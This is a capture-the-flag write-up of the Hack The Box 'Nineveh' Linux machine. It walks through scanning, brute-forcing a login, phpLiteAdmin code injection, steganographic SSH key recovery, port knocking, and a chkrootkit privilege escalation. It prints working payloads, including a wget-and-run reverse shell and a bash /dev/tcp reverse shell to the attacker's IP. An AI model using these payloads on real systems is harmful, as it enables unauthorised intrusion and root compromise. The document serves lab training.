## Default Information
IP Address: 10.10.10.43\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.43    nineveh.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.43 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-03 02:47:33 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 443/tcp on 10.10.10.43                                    
Discovered open port 80/tcp on 10.10.10.43 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| HTTP | Apache httpd 2.4.18 ((Ubuntu)) | Open |
| 443	| SSL/HTTP | Apache httpd 2.4.18 ((Ubuntu)) | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://nineveh.htb. One of the interesting endpoints that we have found is that there is an exposed PHPMyInfo page which could be vulnerable to RCE due to LFI. Another interesting endpoint that we manage to discover is the /department endpoint redirects us to a login page.

```
http://10.10.10.43:80/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
http://10.10.10.43:80/index.html           (Status: 200) [Size: 178]
http://10.10.10.43:80/info.php             (Status: 200) [Size: 83697]
http://10.10.10.43:80/server-status        (Status: 403) [Size: 299]
```

Next, we will try to use Gobuster to find endpoints accessible from http://nineveh.htb. From the /db endpoint, we discover a phpLiteAdmin login interface that can be potentially be bruteforced. Apart from that, /index.html is also rather suspicious as it only presents a page with an image. We will download the image for furthur references later.

```
https://10.10.10.43:443/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
https://10.10.10.43:443/index.html           (Status: 200) [Size: 49]
```
### Web-Exploration

Exploring http://nineveh.htb/department/login.php, I realized that the error message tells me if the username is available. Checking the user ```test``` tells me that the username is not available, while checking the user ```admin``` tells me that that username is available.

![Test username](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/test_username.png)
![Admin username](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/admin_username.png)

## Exploit
### Bruteforcing login for /department endpoint

Testing the http://ninveh.htb/department/login.php endpoint with some of the common admin credentials does not seem to work as we are unable to gain access. 

Next, we will try to brute force the login with wfuzz using seclist's password list, and we are able to obtain the credentials

```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -z file,/home/kali/Desktop/password.txt -d "username=admin&password=FUZZ" --hs Invalid http://nineveh.htb/department/login.php
Target: http://nineveh.htb/department/login.php
Total requests: 200

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000075:   302        59 L     113 W      1706 Ch     "1q2w3e4r5t"                
```
Using the credentials, we are able to find http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt where we got some saved text which prompted me to check out https://nineveh.htb/db

![Saved Notes](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/saved_notes.png)

Apart from that, we also realized that if we used ninevehNote.php in the url, we are able to get an error message. But if we use other filenames, we are unable to get an error message. This means that any php file that we try to use will have to be ninvehNotes.php.

![Nineveh.php](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/nineveh_php.png)

### Exploiting PHPLiteAdmin

Navigating to https://nineveh.htb/db, we are able to find a phpliteadmin page, and searching for exploits of phpliteadmin, we are able to find a remote PHP Code Injection. However to exploit this, we would first need to login the database.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit phpliteadmin              
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                       | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection             | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities              | php/webapps/39714.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Let's first create a database named ninevehNotes.php. Afterwards, we will create a table in the database and put ```<?php system("wget http://10.10.16.4:3000/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>``` into every field. This will then download the php reverse shell from our local machine and save it to /tmp directory on the server. Afterwards, we will then execute the php reverse shell payload and obtain a reverse shell.

### Privilege Escalation to amrois

First, let's stabilize the reverse shell.
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.43] 43988
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 23:09:42 up  2:16,  0 users,  load average: 0.04, 0.06, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@nineveh:/$ export TERM=xterm
export TERM=xterm
www-data@nineveh:/$ stty cols 132 rows 34
stty cols 132 rows 34
```

However, we realize that we still do not have the necessary privileges to read the user flag. Hence, we would need to try to escalate our privileges to the user amoris.

Using linpeas script, we are able to identify a few interesting information. First of all, port 22 is open on the server so this must mean that we should be able to SSH into the amoris user

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```
Apart from that, we are also able to find a knockd file, which means that we probably have to use port knocking to be able to SSH.

Lastly, we also notice that there is an additional ssl folder in the /var/www directory

```
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                   
total 20K
drwxr-xr-x  5 root root 4.0K Jul  2  2017 .
drwxr-xr-x 14 root root 4.0K Jul  2  2017 ..
drwxr-xr-x  2 root root 4.0K Jul  2  2017 cd
drwxr-xr-x  3 root root 4.0K Jul  2  2017 html
drwxr-xr-x  4 root root 4.0K Jul  2  2017 ssl
```

Looking at the ssl directory, it looks like that this is the web directory for https://nineveh.htb. From the server, we are able to find an interesting directory secure_notes. Accessing https://nineveh.htb/secure_notes we are presented with an image, which we will download and examine in detail.

![Secure notes](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/secure_notes.png)

Checking the strings of the image, we are able to find a pair of private and public keys hidden in the image. This tells us that the keys may be hidden in the image using stegnography. With that we will use binwalk to extract the files. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ binwalk -e nineveh.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```

Examining the tar archive, we are able to retrieve the private key file. Looking at the nineveh.pub key extracted, we can confirm that this pair of keys belong to amrois. Afterwhich, we will transfer the private key to the server. 

Next, we know that we have a knockd file. Now, we will have to find the order in which the ports are being knocked. Checking the knockd.conf file, we are able to find the sequence where the ports are being connected.

```
www-data@nineveh:/tmp$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Let us make a short script to do port knocking.

```
for x in 571 290 911; do nmap -Pn --host-timeout 50 --max-retries 0 -p $x 10.10.10.43; done;
```

Afterwards, we will then be able to SSH into the server as amrois

```
┌──(kali㉿kali)-[~/Desktop/extracted/secret]
└─$ ssh -i nineveh.priv amrois@10.10.10.43                                               
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ 
```
### Obtaining user flag

```
amrois@nineveh:~$ cat user.txt
<Redacted user text>
```

### Privilege Escalation to root

Using the LinEnum script, we realize that there is a script running on a cron job

```
[-] Jobs held by all users:
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh
```

Viewing the script running on cronjob, we realize that this script is actually deleted all the text files in the /report folder.

```
amrois@nineveh:~$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
```

Looking at the text files in the report directory, it looks like some sort of scan to find malicious files that is running in the background which outputs all the results the directory.

Using [pspy](https://github.com/DominicBreuker/pspy), we will analyze the processes that are running in the background. From the output, we are able to find out that there chkrootkit is running in the background.

```
2021/12/03 11:42:12 CMD: UID=0    PID=1      | /sbin/init 
2021/12/03 11:43:01 CMD: UID=0    PID=13608  | /bin/bash /root/vulnScan.sh 
2021/12/03 11:43:01 CMD: UID=0    PID=13607  | /bin/sh -c /root/vulnScan.sh 
2021/12/03 11:43:01 CMD: UID=0    PID=13606  | /usr/sbin/CRON -f 
2021/12/03 11:43:01 CMD: UID=0    PID=13609  | /bin/sh /usr/bin/chkrootkit 
2021/12/03 11:43:01 CMD: UID=0    PID=13611  | /bin/sh /usr/bin/chkrootkit 
2021/12/03 11:43:01 CMD: UID=0    PID=13614  | /bin/sh /usr/bin/chkrootkit 
2021/12/03 11:43:01 CMD: UID=0    PID=13627  | /bin/uname -s 
```

According to [exploitdb](https://www.exploit-db.com/exploits/33899), chkroot is vulnerable to CVE-2014-0476. We can create an executable file named "update" in the /tmp directory. Afterwards, when chkrootkit runs with root permissions, the "update" binary will be executed.

```
amrois@nineveh:~$ echo -e '!#/bin/bash\n\n/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/8000 0>&1' > update
> ^C
amrois@nineveh:~$ echo -e '!#/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.4/8000 0>&1"' > update
amrois@nineveh:~$ cat update
!#/bin/bash

/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.4/8000 0>&1"
amrois@nineveh:~$ chmod +x update
amrois@nineveh:~$ cp update /tmp/update
```

### Obtaining root flag

```
root@nineveh:~# cat root.txt
cat root.txt
<Redacted root flag>
```

## Post-exploitation

### PHP Type juggling

In the login.php code that is used we realized that the code might be vulnerable to type juggling. This is because strcmp is used in the code below to authenticate the password.

The line where the vulnerability occurs is ```strcmp($_POST['password'], $PASS ) == 0```

```
if(isset($_POST['username']) && isset($_POST['password'])){
        if($_POST['username'] == $USER){
                if(strcmp($_POST['password'], $PASS ) == 0){
                        $_SESSION['username'] = $USER;
                        header( 'Location: manage.php' ) ;
                } else { $error = "Invalid Password!"; }
} 
```

This is actually because if we supply an array to pass in as the string parameter, the strcmp function still returns 0.

Running the vulnerable sample code below returns 0 as well.

```
<?php
        $str1 = "pink"; 
        $str2 = array("name" => "floyd");

        if(strcmp($str1, $str2 == 0)){
                echo "returns 0!! VULNERABLE!";
        }else{
                echo "Not vulnerable!";
        }
?>
```

Lastly, we can exploit this vulnerability by modifying the the body parameter when we login. As long as we have a valid username, we will be able to authenticate as the user.

![Type Juggling](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/type_juggling.png)

### Exploiting info.php using LFI

Using all the information that we have previously, we are able to find an LFI at http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../etc/passwd

![LFI](./Images/lfi.png)

We can modify the GET request at the phpinfo() page to a POST request accordingly.

```
Content-Type: multipart/form-data; boundary=---------------------------7db268605ae

-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt" Content-Type: text/plainSecurity
Test
-----------------------------7db268605ae
```

With some luck, if we can visit the page before the page goes away, we are able to spawn the reverse shell.

![Php my info page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Nineveh/phpmyinfo.png)
